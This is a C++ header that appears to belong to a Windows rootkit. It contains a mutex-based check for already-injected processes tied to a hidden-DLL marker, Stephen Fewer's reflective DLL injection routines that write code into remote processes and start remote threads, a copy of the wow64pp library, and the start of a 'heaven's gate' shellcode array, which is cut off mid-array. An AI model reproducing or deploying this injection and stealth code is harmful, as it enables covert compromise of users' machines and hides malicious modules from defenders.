#pragma once
#ifndef NO_ROOTKIT
#ifndef __RKIT_LOADED
#define __RKIT_LOADED
#include <Windows.h>
#define _WIN32_DCOM
#include <iostream>
using namespace std;
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib") //WMI
#include <atlbase.h>
#include <atlstr.h>
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <fstream>
#pragma comment(lib, "ntdll.lib") //for RtlAdjustPrivilege in heavens gate 
#define SE_DEBUG_PRIVILEGE 20
extern "C" NTSYSAPI NTSTATUS WINAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
char* dllhide = "$6829";
char* mutexseparator = ":";
bool IsInjected(DWORD pid)
{
    CHAR Mutant[64];
    sprintf(Mutant, "%d%s%s", pid, mutexseparator, dllhide);
    HANDLE hMu = OpenMutexA(MAXIMUM_ALLOWED, 0, Mutant);
    if (!hMu)
        return 0;
    CloseHandle(hMu);

    return 1;
}

//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//

// we declare some common stuff in here...

#define DLL_QUERY_HMODULE		6

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

typedef ULONG_PTR(WINAPI* REFLECTIVELOADER)(VOID);
typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);

#define DLLEXPORT   __declspec( dllexport )


DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer);

HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength);
//===============================================================================================//
DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
	{
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}

	return 0;
}
//===============================================================================================//
DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer)
{
	UINT_PTR uiBaseAddress = 0;
	UINT_PTR uiExportDir = 0;
	UINT_PTR uiNameArray = 0;
	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameOrdinals = 0;
	DWORD dwCounter = 0;
#ifdef _M_X64
	DWORD dwCompiledArch = 2;
#else
	// This will catch Win32 and WinRT.
	DWORD dwCompiledArch = 1;
#endif

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// currenlty we can only process a PE file which is the same type as the one this fuction has  
	// been compiled as, due to various offset in the PE structures being defined at compile time.
	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
	{
		if (dwCompiledArch != 1)
			return 0;
	}
	else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
	{
		if (dwCompiledArch != 2)
			return 0;
	}
	else
	{
		return 0;
	}

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while (dwCounter--)
	{
		char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

		if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL)
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}
//===============================================================================================//
// Loads a DLL image from memory via its exported ReflectiveLoader function
HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength)
{
	HMODULE hResult = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwOldProtect1 = 0;
	DWORD dwOldProtect2 = 0;
	REFLECTIVELOADER pReflectiveLoader = NULL;
	DLLMAIN pDllMain = NULL;

	if (lpBuffer == NULL || dwLength == 0)
		return NULL;

	__try
	{
		// check if the library has a ReflectiveLoader...
		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
		if (dwReflectiveLoaderOffset != 0)
		{
			pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);

			// we must VirtualProtect the buffer to RWX so we can execute the ReflectiveLoader...
			// this assumes lpBuffer is the base address of the region of pages and dwLength the size of the region
			if (VirtualProtect(lpBuffer, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect1))
			{
				// call the librarys ReflectiveLoader...
				pDllMain = (DLLMAIN)pReflectiveLoader();
				if (pDllMain != NULL)
				{
					// call the loaded librarys DllMain to get its HMODULE
					if (!pDllMain(NULL, DLL_QUERY_HMODULE, &hResult))
						hResult = NULL;
				}
				// revert to the previous protection flags...
				VirtualProtect(lpBuffer, dwLength, dwOldProtect1, &dwOldProtect2);
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		hResult = NULL;
	}

	return hResult;
}
//===============================================================================================//
// Loads a PE image from memory into the address space of a host process via the image's exported ReflectiveLoader function
// Note: You must compile whatever you are injecting with REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR 
//       defined in order to use the correct RDI prototypes.
// Note: The hProcess handle must have these access rights: PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
//       PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
// Note: If you are passing in an lpParameter value, if it is a pointer, remember it is for a different address space.
// Note: This function currently cant inject accross architectures, but only to architectures which are the 
//       same as the arch this function is compiled as, e.g. x86->x86 and x64->x64 but not x64->x86 or x86->x64.
HANDLE WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
{
	BOOL bSuccess = FALSE;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwThreadId = 0;
	DWORD oldP = 0;

	__try
	{
		do
		{
			if (!hProcess || !lpBuffer || !dwLength)
				break;

			// check if the library has a ReflectiveLoader...
			dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
			if (!dwReflectiveLoaderOffset)
			{
				printf("Error: Cannot find Reflective DLL offset!");
				break;
			}

			// alloc memory (RWX) in the host process for the image...
			lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!lpRemoteLibraryBuffer)
				break;

			// Self Reflective: Save in MS-DOS header the the DLL size, skipping MZ bytes
			*(DWORD*)((unsigned char*)lpBuffer + 2) = dwLength;

			// write the image into the host process...
			if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
				break;

			// Use only PAGE_EXECUTE_READ

			if (!VirtualProtectEx(hProcess, lpRemoteLibraryBuffer, dwLength, PAGE_EXECUTE_READ, &oldP))
				break;

			// add the offset to ReflectiveLoader() to the remote library address...
			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

			// create a remote thread in the host process to call the ReflectiveLoader!
			hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);

		} while (0);

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		hThread = NULL;
	}

	return hThread;
}
//===============================================================================================//

/*
 * Copyright 2017 - 2018 Justas Masiulis
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#ifndef WOW64PP_HPP
#define WOW64PP_HPP

#include <system_error>
#include <memory>
#include <cstring> // memcpy

namespace wow64pp {

    namespace defs {

        using NtQueryInformationProcessT =
            long(__stdcall*)(void* ProcessHandle,
                unsigned long  ProcessInformationClass,
                void* ProcessInformation,
                unsigned long  ProcessInformationLength,
                unsigned long* ReturnLength);

        using NtWow64ReadVirtualMemory64T =
            long(__stdcall*)(void* ProcessHandle,
                unsigned __int64  BaseAddress,
                void* Buffer,
                unsigned __int64  Size,
                unsigned __int64* NumberOfBytesRead);

        struct LIST_ENTRY_64 {
            std::uint64_t Flink;
            std::uint64_t Blink;
        };

        struct UNICODE_STRING_64 {
            unsigned short Length;
            unsigned short MaximumLength;
            std::uint64_t  Buffer;
        };

        struct PROCESS_BASIC_INFORMATION_64 {
            std::uint64_t _unused_1;
            std::uint64_t PebBaseAddress;
            std::uint64_t _unused_2[4];
        };

        struct PEB_64 {
            unsigned char _unused_1[4];
            std::uint64_t _unused_2[2];
            std::uint64_t Ldr;
        };

        struct PEB_LDR_DATA_64 {
            unsigned long Length;
            unsigned long Initialized;
            std::uint64_t SsHandle;
            LIST_ENTRY_64 InLoadOrderModuleList;
        };

        struct LDR_DATA_TABLE_ENTRY_64 {
            LIST_ENTRY_64 InLoadOrderLinks;
            LIST_ENTRY_64 InMemoryOrderLinks;
            LIST_ENTRY_64 InInitializationOrderLinks;
            std::uint64_t DllBase;
            std::uint64_t EntryPoint;
            union {
                unsigned long SizeOfImage;
                std::uint64_t _dummy;
            };
            UNICODE_STRING_64 FullDllName;
            UNICODE_STRING_64 BaseDllName;
        };

        struct IMAGE_EXPORT_DIRECTORY {
            unsigned long  Characteristics;
            unsigned long  TimeDateStamp;
            unsigned short MajorVersion;
            unsigned short MinorVersion;
            unsigned long  Name;
            unsigned long  Base;
            unsigned long  NumberOfFunctions;
            unsigned long  NumberOfNames;
            unsigned long  AddressOfFunctions; // RVA from base of image
            unsigned long  AddressOfNames; // RVA from base of image
            unsigned long  AddressOfNameOrdinals; // RVA from base of image
        };

        struct IMAGE_DOS_HEADER { // DOS .EXE header
            unsigned short e_magic; // Magic number
            unsigned short e_cblp; // Bytes on last page of file
            unsigned short e_cp; // Pages in file
            unsigned short e_crlc; // Relocations
            unsigned short e_cparhdr; // Size of header in paragraphs
            unsigned short e_minalloc; // Minimum extra paragraphs needed
            unsigned short e_maxalloc; // Maximum extra paragraphs needed
            unsigned short e_ss; // Initial (relative) SS value
            unsigned short e_sp; // Initial SP value
            unsigned short e_csum; // Checksum
            unsigned short e_ip; // Initial IP value
            unsigned short e_cs; // Initial (relative) CS value
            unsigned short e_lfarlc; // File address of relocation table
            unsigned short e_ovno; // Overlay number
            unsigned short e_res[4]; // Reserved words
            unsigned short e_oemid; // OEM identifier (for e_oeminfo)
            unsigned short e_oeminfo; // OEM information; e_oemid specific
            unsigned short e_res2[10]; // Reserved words
            long           e_lfanew; // File address of new exe header
        };

        struct IMAGE_FILE_HEADER {
            unsigned short Machine;
            unsigned short NumberOfSections;
            unsigned long  TimeDateStamp;
            unsigned long  PointerToSymbolTable;
            unsigned long  NumberOfSymbols;
            unsigned short SizeOfOptionalHeader;
            unsigned short Characteristics;
        };

        struct IMAGE_DATA_DIRECTORY {
            unsigned long VirtualAddress;
            unsigned long Size;
        };

        struct IMAGE_OPTIONAL_HEADER64 {
            constexpr static std::size_t image_num_dir_entries = 16;
            unsigned short               Magic;
            unsigned char                MajorLinkerVersion;
            unsigned char                MinorLinkerVersion;
            unsigned long                SizeOfCode;
            unsigned long                SizeOfInitializedData;
            unsigned long                SizeOfUninitializedData;
            unsigned long                AddressOfEntryPoint;
            unsigned long                BaseOfCode;
            std::uint64_t                ImageBase;
            unsigned long                SectionAlignment;
            unsigned long                FileAlignment;
            unsigned short               MajorOperatingSystemVersion;
            unsigned short               MinorOperatingSystemVersion;
            unsigned short               MajorImageVersion;
            unsigned short               MinorImageVersion;
            unsigned short               MajorSubsystemVersion;
            unsigned short               MinorSubsystemVersion;
            unsigned long                Win32VersionValue;
            unsigned long                SizeOfImage;
            unsigned long                SizeOfHeaders;
            unsigned long                CheckSum;
            unsigned short               Subsystem;
            unsigned short               DllCharacteristics;
            std::uint64_t                SizeOfStackReserve;
            std::uint64_t                SizeOfStackCommit;
            std::uint64_t                SizeOfHeapReserve;
            std::uint64_t                SizeOfHeapCommit;
            unsigned long                LoaderFlags;
            unsigned long                NumberOfRvaAndSizes;
            IMAGE_DATA_DIRECTORY         DataDirectory[image_num_dir_entries];
        };

        struct IMAGE_NT_HEADERS64 {
            unsigned long           Signature;
            IMAGE_FILE_HEADER       FileHeader;
            IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        };

    } // namespace defs

    namespace detail {

        constexpr static auto image_directory_entry_export = 0;
        constexpr static auto ordinal_not_found = 0xC0000138;

        typedef int(__stdcall* FARPROC)();

        extern "C" {

            __declspec(dllimport) unsigned long __stdcall GetLastError();

            __declspec(dllimport) void* __stdcall GetCurrentProcess();

            __declspec(dllimport) int __stdcall DuplicateHandle(
                void* hSourceProcessHandle,
                void* hSourceHandle,
                void* hTargetProcessHandle,
                void** lpTargetHandle,
                unsigned long dwDesiredAccess,
                int           bInheritHandle,
                unsigned long dwOptions);

            __declspec(dllimport) void* __stdcall GetModuleHandleA(
                const char* lpModuleName);

            __declspec(dllimport) FARPROC
                __stdcall GetProcAddress(void* hModule, const char* lpProcName);
        }

        inline std::error_code get_last_error() noexcept
        {
            return std::error_code(static_cast<int>(GetLastError()),
                std::system_category());
        }


        inline void throw_last_error(const char* message)
        {
            throw std::system_error(get_last_error(), message);
        }


        inline void throw_if_failed(const char* message, int hr)
        {
            if (hr < 0)
                throw std::system_error(std::error_code(hr, std::system_category()),
                    message);
        }

        inline void* self_handle()
        {
            void* h;

            if (DuplicateHandle(GetCurrentProcess(),
                GetCurrentProcess(),
                GetCurrentProcess(),
                &h,
                0,
                0,
                0x00000002) == 0) // DUPLICATE_SAME_ACCESS
                throw_last_error("failed to duplicate current process handle");

            return h;
        }

        inline void* self_handle(std::error_code& ec) noexcept
        {
            void* h;

            if (DuplicateHandle(GetCurrentProcess(),
                GetCurrentProcess(),
                GetCurrentProcess(),
                &h,
                0,
                0,
                0x00000002) == 0) // DUPLICATE_SAME_ACCESS
                ec = get_last_error();

            return h;
        }

        inline void* native_module_handle(const char* name)
        {
            const auto addr = GetModuleHandleA(name);
            if (addr == nullptr)
                throw_last_error("GetModuleHandleA() failed");

            return addr;
        }

        inline void* native_module_handle(const char* name,
            std::error_code& ec) noexcept
        {
            const auto addr = GetModuleHandleA(name);
            if (addr == nullptr)
                ec = get_last_error();

            return addr;
        }


        template<typename F>
        inline F native_ntdll_function(const char* name)
        {
            const static auto ntdll_addr = native_module_handle("ntdll.dll");
            auto f = reinterpret_cast<F>(detail::GetProcAddress(ntdll_addr, name));

            if (f == nullptr)
                throw_last_error("failed to get address of ntdll function");

            return f;
        }

        template<typename F>
        inline F native_ntdll_function(const char* name,
            std::error_code& ec) noexcept
        {
            const auto ntdll_addr = native_module_handle("ntdll.dll", ec);
            if (ec)
                return nullptr;

            const auto f =
                reinterpret_cast<F>(detail::GetProcAddress(ntdll_addr, name));

            if (f == nullptr)
                ec = detail::get_last_error();

            return f;
        }


        inline std::uint64_t peb_address()
        {
            const static auto NtWow64QueryInformationProcess64 =
                native_ntdll_function<defs::NtQueryInformationProcessT>(
                    "NtWow64QueryInformationProcess64");

            defs::PROCESS_BASIC_INFORMATION_64 pbi;
            const auto                         hres =
                NtWow64QueryInformationProcess64(GetCurrentProcess(),
                    0 // ProcessBasicInformation
                    ,
                    &pbi,
                    sizeof(pbi),
                    nullptr);
            throw_if_failed("NtWow64QueryInformationProcess64() failed", hres);

            return pbi.PebBaseAddress;
        }

        inline std::uint64_t peb_address(std::error_code& ec) noexcept
        {
            const auto NtWow64QueryInformationProcess64 =
                native_ntdll_function<defs::NtQueryInformationProcessT>(
                    "NtWow64QueryInformationProcess64", ec);
            if (ec)
                return 0;

            defs::PROCESS_BASIC_INFORMATION_64 pbi;
            const auto                         hres =
                NtWow64QueryInformationProcess64(GetCurrentProcess(),
                    0 // ProcessBasicInformation
                    ,
                    &pbi,
                    sizeof(pbi),
                    nullptr);
            if (hres < 0)
                ec = detail::get_last_error();

            return pbi.PebBaseAddress;
        }


        template<typename P>
        inline void
            read_memory(std::uint64_t address, P* buffer, std::size_t size = sizeof(P))
        {
            if (address < std::numeric_limits<std::uint32_t>::max()) {
                std::memcpy(buffer,
                    reinterpret_cast<const void*>(
                        static_cast<std::uint32_t>(address)),
                    size);
                return;
            }

            const static auto NtWow64ReadVirtualMemory64 =
                native_ntdll_function<defs::NtWow64ReadVirtualMemory64T>(
                    "NtWow64ReadVirtualMemory64");

            HANDLE h_self = self_handle();
            auto   hres =
                NtWow64ReadVirtualMemory64(h_self, address, buffer, size, nullptr);
            CloseHandle(h_self);
            throw_if_failed("NtWow64ReadVirtualMemory64() failed", hres);
        }

        template<typename P>
        inline void read_memory(std::uint64_t    address,
            P* buffer,
            std::size_t      size,
            std::error_code& ec) noexcept
        {
            if (address < std::numeric_limits<std::uint32_t>::max()) {
                std::memcpy(buffer,
                    reinterpret_cast<const void*>(
                        static_cast<std::uint32_t>(address)),
                    size);
                return;
            }

            const auto NtWow64ReadVirtualMemory64 =
                native_ntdll_function<defs::NtWow64ReadVirtualMemory64T>(
                    "NtWow64ReadVirtualMemory64", ec);
            if (ec)
                return;

            HANDLE h_self = self_handle(ec);
            if (ec)
                return;
            auto hres =
                NtWow64ReadVirtualMemory64(h_self, address, buffer, size, nullptr);
            CloseHandle(h_self);
            if (hres < 0)
                ec = get_last_error();

            return;
        }


        template<typename T>
        inline T read_memory(std::uint64_t address)
        {
            typename std::aligned_storage<sizeof(T),
                std::alignment_of<T>::value>::type buffer;
            read_memory(address, &buffer, sizeof(T));
            return *static_cast<T*>(static_cast<void*>(&buffer));
        }

        template<typename T>
        inline T read_memory(std::uint64_t address, std::error_code& ec) noexcept
        {
            typename std::aligned_storage<sizeof(T),
                std::alignment_of<T>::value>::type buffer;
            read_memory(address, &buffer, sizeof(T), ec);
            return *static_cast<T*>(static_cast<void*>(&buffer));
        }

    } // namespace detail


    /** \brief An equalient of winapi GetModuleHandle function.
     *   \param[in] module_name The name of the module to get the handle of.
     *   \return    The handle to the module as a 64 bit integer.
     *   \exception Throws std::system_error on failure.
     */
    inline std::uint64_t module_handle(const std::string& module_name)
    {
        const auto ldr_base =
            detail::read_memory<defs::PEB_64>(detail::peb_address()).Ldr;

        const auto last_entry =
            ldr_base + offsetof(defs::PEB_LDR_DATA_64, InLoadOrderModuleList);

        defs::LDR_DATA_TABLE_ENTRY_64 head;
        head.InLoadOrderLinks.Flink =
            detail::read_memory<defs::PEB_LDR_DATA_64>(ldr_base)
            .InLoadOrderModuleList.Flink;

        do {
            try {
                detail::read_memory(head.InLoadOrderLinks.Flink, &head);
            }
            catch (std::system_error&) {
                continue;
            }

            const auto other_module_name_len =
                head.BaseDllName.Length / sizeof(wchar_t);
            if (other_module_name_len != module_name.length())
                continue;

            auto other_module_name =
                std::make_unique<wchar_t[]>(other_module_name_len);
            detail::read_memory(head.BaseDllName.Buffer,
                other_module_name.get(),
                head.BaseDllName.Length);

            if (std::equal(
                begin(module_name), end(module_name), other_module_name.get()))
                return head.DllBase;
        } while (head.InLoadOrderLinks.Flink != last_entry);

        throw std::system_error(
            std::error_code(detail::ordinal_not_found, std::system_category()),
            "Could not get x64 module handle");
    }

    /** \brief An equalient of winapi GetModuleHandle function.
     *   \param[in] module_name The name of the module to get the handle of.
     *   \param[out] ec An error code that will be set in case of failure
     *   \return    The handle to the module as a 64 bit integer.
     *   \exception Does not throw.
     */
    inline std::uint64_t module_handle(const std::string& module_name,
        std::error_code& ec)
    {
        const auto ldr_base =
            detail::read_memory<defs::PEB_64>(detail::peb_address(ec), ec).Ldr;
        if (ec)
            return 0;

        const auto last_entry =
            ldr_base + offsetof(defs::PEB_LDR_DATA_64, InLoadOrderModuleList);

        defs::LDR_DATA_TABLE_ENTRY_64 head;
        head.InLoadOrderLinks.Flink =
            detail::read_memory<defs::PEB_LDR_DATA_64>(ldr_base, ec)
            .InLoadOrderModuleList.Flink;
        if (ec)
            return 0;

        do {
            detail::read_memory(
                head.InLoadOrderLinks.Flink, &head, sizeof(head), ec);
            if (ec)
                continue;

            const auto other_module_name_len =
                head.BaseDllName.Length / sizeof(wchar_t);
            if (other_module_name_len != module_name.length())
                continue;

            auto other_module_name =
                std::make_unique<wchar_t[]>(other_module_name_len);
            detail::read_memory(head.BaseDllName.Buffer,
                other_module_name.get(),
                head.BaseDllName.Length,
                ec);
            if (ec)
                continue;

            if (std::equal(
                begin(module_name), end(module_name), other_module_name.get()))
                return head.DllBase;

        } while (head.InLoadOrderLinks.Flink != last_entry);

        if (!ec)
            ec = std::error_code(detail::ordinal_not_found, std::system_category());

        return 0;
    }

    namespace detail {

        inline defs::IMAGE_EXPORT_DIRECTORY
            image_export_dir(std::uint64_t ntdll_base)
        {
            const auto e_lfanew =
                read_memory<defs::IMAGE_DOS_HEADER>(ntdll_base).e_lfanew;

            const auto idd_virtual_addr =
                read_memory<defs::IMAGE_NT_HEADERS64>(ntdll_base + e_lfanew)
                .OptionalHeader.DataDirectory[image_directory_entry_export]
                .VirtualAddress;

            if (idd_virtual_addr == 0)
                throw std::runtime_error(
                    "IMAGE_EXPORT_DIRECTORY::VirtualAddress was 0");

            return read_memory<defs::IMAGE_EXPORT_DIRECTORY>(ntdll_base +
                idd_virtual_addr);
        }

        inline defs::IMAGE_EXPORT_DIRECTORY
            image_export_dir(std::uint64_t ntdll_base, std::error_code& ec) noexcept
        {
            const auto e_lfanew =
                read_memory<defs::IMAGE_DOS_HEADER>(ntdll_base, ec).e_lfanew;
            if (ec)
                return {};

            const auto idd_virtual_addr =
                read_memory<defs::IMAGE_NT_HEADERS64>(ntdll_base + e_lfanew, ec)
                .OptionalHeader.DataDirectory[image_directory_entry_export]
                .VirtualAddress;
            if (ec)
                return {};

            if (idd_virtual_addr == 0) {
                ec = std::error_code(ordinal_not_found, std::system_category());
                return {};
            }

            return read_memory<defs::IMAGE_EXPORT_DIRECTORY>(
                ntdll_base + idd_virtual_addr, ec);
        }


        inline std::uint64_t ldr_procedure_address()
        {
            const static auto ntdll_base = module_handle("ntdll.dll");

            const auto ied = image_export_dir(ntdll_base);

            auto rva_table =
                std::make_unique<unsigned long[]>(ied.NumberOfFunctions);
            read_memory(ntdll_base + ied.AddressOfFunctions,
                rva_table.get(),
                sizeof(unsigned long) * ied.NumberOfFunctions);

            auto ord_table =
                std::make_unique<unsigned short[]>(ied.NumberOfFunctions);
            read_memory(ntdll_base + ied.AddressOfNameOrdinals,
                ord_table.get(),
                sizeof(unsigned short) * ied.NumberOfFunctions);

            auto name_table = std::make_unique<unsigned long[]>(ied.NumberOfNames);
            read_memory(ntdll_base + ied.AddressOfNames,
                name_table.get(),
                sizeof(unsigned long) * ied.NumberOfNames);

            const std::string to_find("LdrGetProcedureAddress");
            std::string       buffer = to_find;

            const std::size_t n =
                (ied.NumberOfFunctions > ied.NumberOfNames ? ied.NumberOfNames
                    : ied.NumberOfFunctions);
            for (std::size_t i = 0; i < n; ++i) {
                read_memory(ntdll_base + name_table[i], &buffer[0], buffer.size());

                if (buffer == to_find)
                    return ntdll_base + rva_table[ord_table[i]];
            }

            throw std::system_error(
                std::error_code(ordinal_not_found, std::system_category()),
                "could find x64 LdrGetProcedureAddress()");
        }

        inline std::uint64_t ldr_procedure_address(std::error_code& ec)
        {
            const static auto ntdll_base = module_handle("ntdll.dll", ec);
            if (ec)
                return 0;

            const auto ied = image_export_dir(ntdll_base, ec);
            if (ec)
                return 0;

            auto rva_table =
                std::make_unique<unsigned long[]>(ied.NumberOfFunctions);
            read_memory(ntdll_base + ied.AddressOfFunctions,
                rva_table.get(),
                sizeof(unsigned long) * ied.NumberOfFunctions,
                ec);
            if (ec)
                return 0;

            auto ord_table =
                std::make_unique<unsigned short[]>(ied.NumberOfFunctions);
            read_memory(ntdll_base + ied.AddressOfNameOrdinals,
                ord_table.get(),
                sizeof(unsigned short) * ied.NumberOfFunctions,
                ec);
            if (ec)
                return 0;

            auto name_table = std::make_unique<unsigned long[]>(ied.NumberOfNames);
            read_memory(ntdll_base + ied.AddressOfNames,
                name_table.get(),
                sizeof(unsigned long) * ied.NumberOfNames,
                ec);
            if (ec)
                return 0;

            const std::string to_find("LdrGetProcedureAddress");
            std::string       buffer;
            buffer.resize(to_find.size());

            const std::size_t n = ied.NumberOfFunctions > ied.NumberOfNames
                ? ied.NumberOfNames
                : ied.NumberOfFunctions;

            for (std::size_t i = 0; i < n; ++i) {
                read_memory(
                    ntdll_base + name_table[i], &buffer[0], buffer.size(), ec);
                if (ec)
                    continue;

                if (buffer == to_find)
                    return ntdll_base + rva_table[ord_table[i]];
            }

            ec = std::error_code(ordinal_not_found, std::system_category());
            return 0;
        }

    } // namespace detail


    /** \brief Calls a 64 bit function from 32 bit process
     *   \param[in] func The address of 64 bit function to be called.
     *   \param[in] args... The arguments for the function to be called.
     *   \return    An error_code specifying whether the call succeeded.
     *   \exception Does not throw.
     */
    template<class... Args>
    inline std::uint64_t call_function(std::uint64_t func, Args... args)
    {
        std::uint64_t arr_args[sizeof...(args) > 4 ? sizeof...(args) : 4] = { (std::uint64_t)(args)... };

        // clang-format off
        constexpr static std::uint8_t shellcode[] = {
            0x55,             // push ebp
            0x89, 0xE5,       // mov ebp, esp

            0x83, 0xE4, 0xF0, // and esp, 0xFFFFFFF0

            // enter 64 bit mode
            0x6A, 0x33, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x83, 0x04, 0x24, 0x05, 0xCB,

            0x67, 0x48, 0x8B, 0x4D, 16, // mov rcx, [ebp + 16]
